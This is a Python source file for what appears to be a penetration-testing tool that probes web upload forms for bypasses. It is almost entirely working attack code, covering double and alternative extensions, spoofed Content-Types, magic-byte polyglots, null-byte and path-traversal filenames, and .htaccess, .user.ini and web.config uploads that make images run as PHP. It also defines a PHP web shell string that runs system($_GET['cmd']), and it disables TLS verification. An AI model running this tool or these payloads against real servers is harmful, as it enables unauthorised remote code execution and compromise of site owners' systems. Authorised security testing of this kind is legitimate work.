"""
File Upload Bypass Testing Wrapper

Tests for file upload bypass vulnerabilities including:
- Double extension bypass
- Case manipulation
- Special/alternative extensions
- Content-Type bypass
- Magic bytes injection
- Null byte injection
- Path traversal in filename
- .htaccess upload
"""
import sys
import argparse
import json
import requests
import io
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import BaseToolWrapper


@dataclass
class UploadFinding:
    """Represents a file upload bypass finding"""
    technique: str
    filename: str
    content_type: str
    status_code: int
    response_length: int
    upload_success: bool
    potential_rce: bool
    evidence: Optional[str] = None
    uploaded_path: Optional[str] = None


class FileUploadBypass(BaseToolWrapper):
    """File upload bypass testing wrapper."""

    # PHP shell payloads (benign - just echoes for detection)
    PHP_PAYLOAD = b'<?php echo "UPLOAD_TEST_SUCCESS"; ?>'
    PHP_PAYLOAD_FULL = b'<?php echo "UPLOAD_TEST_SUCCESS"; system($_GET["cmd"]); ?>'

    # ASP/ASPX payloads
    ASP_PAYLOAD = b'<% Response.Write("UPLOAD_TEST_SUCCESS") %>'
    ASPX_PAYLOAD = b'<%@ Page Language="C#" %><%Response.Write("UPLOAD_TEST_SUCCESS");%>'

    # JSP payload
    JSP_PAYLOAD = b'<% out.println("UPLOAD_TEST_SUCCESS"); %>'

    # Double extension bypass techniques
    DOUBLE_EXTENSIONS = [
        'shell.php.jpg',
        'shell.php.png',
        'shell.php.gif',
        'shell.php.pdf',
        'shell.jpg.php',
        'shell.png.php',
        'shell.php%00.jpg',  # Null byte
        'shell.php\x00.jpg',  # Null byte
        'shell.php.jpeg',
        'shell.php%0a.jpg',  # Newline
        'shell.php%0d.jpg',  # Carriage return
    ]

    # Case manipulation
    CASE_VARIATIONS = [
        'shell.pHp',
        'shell.PhP',
        'shell.PHP',
        'shell.pHP',
        'shell.Php',
        'shell.phP',
    ]

    # Alternative/special PHP extensions
    PHP_EXTENSIONS = [
        'shell.php5',
        'shell.php7',
        'shell.phtml',
        'shell.phar',
        'shell.phps',
        'shell.php.bak',
        'shell.php.old',
        'shell.php.orig',
        'shell.php.txt',
        'shell.php~',
        'shell.inc',
        'shell.module',
        'shell.pht',
        'shell.pgif',  # PHP-GIF polyglot
    ]

    # ASP/ASPX extensions
    ASP_EXTENSIONS = [
        'shell.asp',
        'shell.aspx',
        'shell.asa',
        'shell.cer',
        'shell.cdx',
        'shell.ashx',
        'shell.asmx',
        'shell.svc',
        'shell.cshtml',
        'shell.vbhtml',
    ]

    # JSP extensions
    JSP_EXTENSIONS = [
        'shell.jsp',
        'shell.jspx',
        'shell.jsw',
        'shell.jsv',
        'shell.jspf',
    ]

    # Content-Type bypass combinations
    CONTENT_TYPE_BYPASS = [
        ('shell.php', 'image/jpeg'),
        ('shell.php', 'image/png'),
        ('shell.php', 'image/gif'),
        ('shell.php', 'application/octet-stream'),
        ('shell.php', 'text/plain'),
        ('shell.php', 'application/x-httpd-php'),  # Sometimes whitelisted
        ('shell.php', 'image/jpeg; charset=utf-8'),
    ]

    # Magic bytes for image formats
    MAGIC_BYTES = {
        'gif': b'GIF89a',
        'png': b'\x89PNG\r\n\x1a\n',
        'jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF',
        'bmp': b'BM',
        'pdf': b'%PDF-1.4',
    }

    # Path traversal filenames
    PATH_TRAVERSAL = [
        '../shell.php',
        '..\\shell.php',
        '....//shell.php',
        '....\\\\shell.php',
        '..%2f..%2fshell.php',
        '..%5c..%5cshell.php',
        '%2e%2e%2fshell.php',
        '/var/www/html/shell.php',
        'C:\\inetpub\\wwwroot\\shell.php',
    ]

    # Special files
    SPECIAL_FILES = [
        ('.htaccess', b'AddType application/x-httpd-php .jpg'),
        ('.user.ini', b'auto_prepend_file=shell.jpg'),
        ('web.config', b'<?xml version="1.0"?><configuration><system.webServer><handlers><add name="php" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\php\\php-cgi.exe" /></handlers></system.webServer></configuration>'),
    ]

    # Success indicators in response
    SUCCESS_INDICATORS = [
        'success', 'uploaded', 'complete', 'saved', 'stored',
        'file_path', 'file_url', 'location', 'url',
    ]

    @property
    def tool_name(self) -> str:
        return "file_upload_bypass"

    @property
    def tool_category(self) -> str:
        return "advanced"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """File upload bypass doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_upload(self, url: str, file_param: str = 'file',
                   additional_data: Optional[Dict] = None,
                   headers: Optional[Dict] = None,
                   cookies: Optional[Dict] = None,
                   timeout: int = 15) -> List[UploadFinding]:
        """Test comprehensive file upload bypass techniques."""
        findings = []
        headers = headers or {}
        additional_data = additional_data or {}

        # Test double extensions
        print("[*] Testing double extension bypass...")
        for filename in self.DOUBLE_EXTENSIONS[:8]:
            finding = self._upload_file(
                url, file_param, filename, self.PHP_PAYLOAD,
                'application/x-php', additional_data, headers, cookies, timeout
            )
            finding.technique = 'double_extension'
            findings.append(finding)

        # Test case manipulation
        print("[*] Testing case manipulation...")
        for filename in self.CASE_VARIATIONS:
            finding = self._upload_file(
                url, file_param, filename, self.PHP_PAYLOAD,
                'application/x-php', additional_data, headers, cookies, timeout
            )
            finding.technique = 'case_manipulation'
            findings.append(finding)

        # Test PHP extensions
        print("[*] Testing alternative PHP extensions...")
        for filename in self.PHP_EXTENSIONS[:8]:
            finding = self._upload_file(
                url, file_param, filename, self.PHP_PAYLOAD,
                'application/x-php', additional_data, headers, cookies, timeout
            )
            finding.technique = 'php_extension'
            findings.append(finding)

        # Test content-type bypass
        print("[*] Testing content-type bypass...")
        for filename, content_type in self.CONTENT_TYPE_BYPASS:
            finding = self._upload_file(
                url, file_param, filename, self.PHP_PAYLOAD,
                content_type, additional_data, headers, cookies, timeout
            )
            finding.technique = 'content_type_bypass'
            findings.append(finding)

        # Test magic bytes injection
        print("[*] Testing magic bytes injection...")
        for img_type, magic in self.MAGIC_BYTES.items():
            payload = magic + b'\n' + self.PHP_PAYLOAD
            filename = f'shell.{img_type}.php'
            finding = self._upload_file(
                url, file_param, filename, payload,
                f'image/{img_type}', additional_data, headers, cookies, timeout
            )
            finding.technique = f'magic_bytes_{img_type}'
            findings.append(finding)

        # Test polyglot (GIF + PHP)
        print("[*] Testing polyglot file...")
        polyglot = self.MAGIC_BYTES['gif'] + b'<?php echo "UPLOAD_TEST_SUCCESS"; ?>'
        finding = self._upload_file(
            url, file_param, 'polyglot.gif.php', polyglot,
            'image/gif', additional_data, headers, cookies, timeout
        )
        finding.technique = 'polyglot'
        findings.append(finding)

        return findings

    def test_path_traversal(self, url: str, file_param: str = 'file',
                           additional_data: Optional[Dict] = None,
                           headers: Optional[Dict] = None,
                           cookies: Optional[Dict] = None,
                           timeout: int = 15) -> List[UploadFinding]:
        """Test path traversal in filename."""
        findings = []
        headers = headers or {}
        additional_data = additional_data or {}

        print("[*] Testing path traversal in filename...")
        for filename in self.PATH_TRAVERSAL:
            finding = self._upload_file(
                url, file_param, filename, self.PHP_PAYLOAD,
                'application/x-php', additional_data, headers, cookies, timeout
            )
            finding.technique = 'path_traversal'
            findings.append(finding)

        return findings

    def test_special_files(self, url: str, file_param: str = 'file',
                          additional_data: Optional[Dict] = None,
                          headers: Optional[Dict] = None,
                          cookies: Optional[Dict] = None,
                          timeout: int = 15) -> List[UploadFinding]:
        """Test special file uploads (.htaccess, web.config, etc.)."""
        findings = []
        headers = headers or {}
        additional_data = additional_data or {}

        print("[*] Testing special file uploads...")
        for filename, content in self.SPECIAL_FILES:
            finding = self._upload_file(
                url, file_param, filename, content,
                'application/octet-stream', additional_data, headers, cookies, timeout
            )
            finding.technique = 'special_file'
            findings.append(finding)

        return findings

    def test_asp_upload(self, url: str, file_param: str = 'file',
                       additional_data: Optional[Dict] = None,
                       headers: Optional[Dict] = None,
                       cookies: Optional[Dict] = None,
                       timeout: int = 15) -> List[UploadFinding]:
        """Test ASP/ASPX file upload bypass."""
        findings = []
        headers = headers or {}
        additional_data = additional_data or {}

        print("[*] Testing ASP/ASPX upload bypass...")
        for filename in self.ASP_EXTENSIONS[:5]:
            payload = self.ASP_PAYLOAD if 'asp' in filename and 'aspx' not in filename else self.ASPX_PAYLOAD
            finding = self._upload_file(
                url, file_param, filename, payload,
                'application/octet-stream', additional_data, headers, cookies, timeout
            )
            finding.technique = 'asp_extension'
            findings.append(finding)

        return findings

    def test_jsp_upload(self, url: str, file_param: str = 'file',
                       additional_data: Optional[Dict] = None,
                       headers: Optional[Dict] = None,
                       cookies: Optional[Dict] = None,
                       timeout: int = 15) -> List[UploadFinding]:
        """Test JSP file upload bypass."""
        findings = []
        headers = headers or {}
        additional_data = additional_data or {}

        print("[*] Testing JSP upload bypass...")
        for filename in self.JSP_EXTENSIONS:
            finding = self._upload_file(
                url, file_param, filename, self.JSP_PAYLOAD,
                'application/octet-stream', additional_data, headers, cookies, timeout
            )
            finding.technique = 'jsp_extension'
            findings.append(finding)

        return findings

    def _upload_file(self, url: str, file_param: str, filename: str,
                    content: bytes, content_type: str,
                    additional_data: Dict, headers: Dict,
                    cookies: Optional[Dict], timeout: int) -> UploadFinding:
        """Upload file and analyze result."""
        try:
            files = {file_param: (filename, io.BytesIO(content), content_type)}

            response = requests.post(
                url,
                files=files,
                data=additional_data,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
                verify=False
            )

            # Analyze response
            upload_success = self._check_upload_success(response)
            uploaded_path = self._extract_upload_path(response)
            potential_rce = upload_success and any(
                ext in filename.lower() for ext in ['.php', '.asp', '.jsp', '.phtml']
            )

            return UploadFinding(
                technique='',
                filename=filename,
                content_type=content_type,
                status_code=response.status_code,
                response_length=len(response.text),
                upload_success=upload_success,
                potential_rce=potential_rce,
                evidence=response.text[:300] if upload_success else None,
                uploaded_path=uploaded_path
            )
        except Exception as e:
            return UploadFinding(
                technique='',
                filename=filename,
                content_type=content_type,
                status_code=0,
                response_length=0,
                upload_success=False,
                potential_rce=False,
                evidence=str(e)
            )

    def _check_upload_success(self, response: requests.Response) -> bool:
        """Check if upload was successful."""
        # Status code check
        if response.status_code not in [200, 201, 302]:
            return False

        text_lower = response.text.lower()

        # Check for success indicators
        if any(ind in text_lower for ind in self.SUCCESS_INDICATORS):
            return True

        # Check for error indicators (upload failed)
        error_indicators = [
            'error', 'invalid', 'not allowed', 'rejected', 'forbidden',
            'denied', 'failed', 'unsupported', 'blocked'
        ]
        if any(ind in text_lower for ind in error_indicators):
            return False

        # If status is 200/201 and no explicit error, might be successful
        return response.status_code in [200, 201]

    def _extract_upload_path(self, response: requests.Response) -> Optional[str]:
        """Try to extract uploaded file path from response."""
        import re

        text = response.text

        # Look for common patterns
        patterns = [
            r'["\']([^"\']*uploads?[^"\']*\.(php|asp|jsp|png|jpg|gif)[^"\']*)["\']',
            r'["\']([^"\']*files?[^"\']*\.(php|asp|jsp|png|jpg|gif)[^"\']*)["\']',
            r'path["\s]*[:=]\s*["\']([^"\']+)["\']',
            r'url["\s]*[:=]\s*["\']([^"\']+)["\']',
            r'location["\s]*[:=]\s*["\']([^"\']+)["\']',
        ]

        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)

        # Check Location header for redirects
        if 'Location' in response.headers:
            return response.headers['Location']

        return None

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run file upload bypass tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        file_param = kwargs.get('file_param', 'file')
        additional_data = kwargs.get('additional_data')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        timeout = kwargs.get('timeout', 15)
        test_type = kwargs.get('test_type', 'all')

        all_findings = []

        print(f"[*] Testing file upload bypass on {target}")

        if test_type in ['all', 'standard']:
            findings = self.test_upload(
                url=target, file_param=file_param,
                additional_data=additional_data, headers=headers,
                cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        if test_type in ['all', 'traversal']:
            findings = self.test_path_traversal(
                url=target, file_param=file_param,
                additional_data=additional_data, headers=headers,
                cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        if test_type in ['all', 'special']:
            findings = self.test_special_files(
                url=target, file_param=file_param,
                additional_data=additional_data, headers=headers,
                cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        if test_type in ['all', 'asp']:
            findings = self.test_asp_upload(
                url=target, file_param=file_param,
                additional_data=additional_data, headers=headers,
                cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        if test_type in ['all', 'jsp']:
            findings = self.test_jsp_upload(
                url=target, file_param=file_param,
                additional_data=additional_data, headers=headers,
                cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter successful uploads and potential RCE
        successful_uploads = [f for f in all_findings if f.upload_success]
        potential_rce = [f for f in all_findings if f.potential_rce]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"file_upload_{timestamp}.json"

        results_data = {
            'target': target,
            'file_param': file_param,
            'total_tests': len(all_findings),
            'successful_uploads': len(successful_uploads),
            'potential_rce': len(potential_rce),
            'findings': [
                {
                    'technique': f.technique,
                    'filename': f.filename,
                    'content_type': f.content_type,
                    'status_code': f.status_code,
                    'upload_success': f.upload_success,
                    'potential_rce': f.potential_rce,
                    'uploaded_path': f.uploaded_path,
                    'evidence': f.evidence
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'successful_uploads': len(successful_uploads),
            'potential_rce': len(potential_rce)
        }


def main():
    parser = argparse.ArgumentParser(
        description="File Upload Bypass Tester - Test for file upload vulnerability bypass techniques",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python file_upload_bypass.py -u "https://example.com/upload"
  python file_upload_bypass.py -u "https://example.com/upload" --param uploadFile
  python file_upload_bypass.py -u "https://example.com/upload" --test-type standard
  python file_upload_bypass.py -u "https://example.com/upload" --data '{"csrf": "token123"}'
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target upload URL")
    parser.add_argument("-p", "--param", default="file", dest="file_param",
                       help="File upload parameter name (default: file)")
    parser.add_argument("--test-type", default="all",
                       choices=['all', 'standard', 'traversal', 'special', 'asp', 'jsp'],
                       help="Type of upload test (default: all)")
    parser.add_argument("-d", "--data", help="Additional form data as JSON")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                       help="Request timeout in seconds (default: 15)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    # Parse additional data
    additional_data = None
    if args.data:
        try:
            additional_data = json.loads(args.data)
        except json.JSONDecodeError:
            # Parse as form data
            additional_data = {}
            for pair in args.data.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    additional_data[key] = value

    tester = FileUploadBypass()

    result = tester.run(
        target=args.url,
        file_param=args.file_param,
        test_type=args.test_type,
        additional_data=additional_data,
        headers=headers if headers else None,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"File Upload Bypass Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"File Parameter: {args.file_param}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Successful Uploads: {result['successful_uploads']}")
    print(f"Potential RCE: {result['potential_rce']}")

    if result['potential_rce'] > 0:
        print(f"\n[!] POTENTIAL REMOTE CODE EXECUTION!")
        for finding in result['results']:
            if finding.potential_rce:
                print(f"\n  Technique: {finding.technique}")
                print(f"  Filename: {finding.filename}")
                print(f"  Content-Type: {finding.content_type}")
                if finding.uploaded_path:
                    print(f"  Uploaded Path: {finding.uploaded_path}")
    elif result['successful_uploads'] > 0:
        print(f"\n[!] Files uploaded successfully (check for execution)")
        for finding in result['results']:
            if finding.upload_success:
                print(f"\n  Technique: {finding.technique}")
                print(f"  Filename: {finding.filename}")
    else:
        print("\n[+] No file upload bypass detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
